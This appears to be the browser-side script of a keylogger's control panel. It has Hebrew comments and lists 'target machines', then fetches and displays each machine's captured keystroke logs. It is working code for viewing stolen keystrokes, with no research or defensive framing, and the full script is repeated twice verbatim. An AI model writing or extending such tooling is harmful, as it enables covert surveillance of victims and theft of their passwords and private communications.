// אלמנטים
const machineDropdown = document.getElementById('machineDropdown');
const selectedMachineSpan = document.getElementById('selectedMachine');
const logsContainer = document.getElementById('logsContainer');

// 1️⃣ קבלת רשימת מכונות מה־API
fetch('/api/get_target_machines_list')
    .then(response => response.json())
    .then(data => {
        const machines = data.machines;
        machines.forEach(machine => {
            const option = document.createElement('option');
            option.value = machine;
            option.textContent = machine;
            machineDropdown.appendChild(option);
        });
    })
    .catch(err => console.error("Error fetching machines:", err));

// 2️⃣ טיפול בבחירת מכונה
machineDropdown.addEventListener('change', () => {
    const selectedMachine = machineDropdown.value;
    selectedMachineSpan.textContent = selectedMachine || "None";

    if (!selectedMachine) {
        logsContainer.innerHTML = "<p>Select a machine to view logs</p>";
        return;
    }

    // 3️⃣ בקשה לקבלת Keystrokes Logs למכונה
    fetch(`/api/get_keystrokes?machine=${selectedMachine}`)
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                logsContainer.innerHTML = `<p>${data.error}</p>`;
                return;
            }

            const logs = data.logs;
            logsContainer.innerHTML = ''; // נקה קודם
            for (const [filename, content] of Object.entries(logs)) {
                const entryDiv = document.createElement('div');
                entryDiv.classList.add('log-entry');

                const title = document.createElement('h3');
                title.textContent = filename;

                const pre = document.createElement('p');
                pre.textContent = content;

                entryDiv.appendChild(title);
                entryDiv.appendChild(pre);
                logsContainer.appendChild(entryDiv);
            }
        })
        .catch(err => {
            logsContainer.innerHTML = `<p>Error fetching logs</p>`;
            console.error(err);
        });
});
// אלמנטים
const machineDropdown = document.getElementById('machineDropdown');
const selectedMachineSpan = document.getElementById('selectedMachine');
const logsContainer = document.getElementById('logsContainer');

// 1️⃣ קבלת רשימת מכונות מה־API
fetch('/api/get_target_machines_list')
    .then(response => response.json())
    .then(data => {
        const machines = data.machines;
        machines.forEach(machine => {
            const option = document.createElement('option');
            option.value = machine;
            option.textContent = machine;
            machineDropdown.appendChild(option);
        });
    })
    .catch(err => console.error("Error fetching machines:", err));

// 2️⃣ טיפול בבחירת מכונה
machineDropdown.addEventListener('change', () => {
    const selectedMachine = machineDropdown.value;
    selectedMachineSpan.textContent = selectedMachine || "None";

    if (!selectedMachine) {
        logsContainer.innerHTML = "<p>Select a machine to view logs</p>";
        return;
    }

    // 3️⃣ בקשה לקבלת Keystrokes Logs למכונה
    fetch(`/api/get_keystrokes?machine=${selectedMachine}`)
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                logsContainer.innerHTML = `<p>${data.error}</p>`;
                return;
            }

            const logs = data.logs;
            logsContainer.innerHTML = ''; // נקה קודם
            for (const [filename, content] of Object.entries(logs)) {
                const entryDiv = document.createElement('div');
                entryDiv.classList.add('log-entry');

                const title = document.createElement('h3');
                title.textContent = filename;

                const pre = document.createElement('p');
                pre.textContent = content;

                entryDiv.appendChild(title);
                entryDiv.appendChild(pre);
                logsContainer.appendChild(entryDiv);
            }
        })
        .catch(err => {
            logsContainer.innerHTML = `<p>Error fetching logs</p>`;
            console.error(err);
        });
});
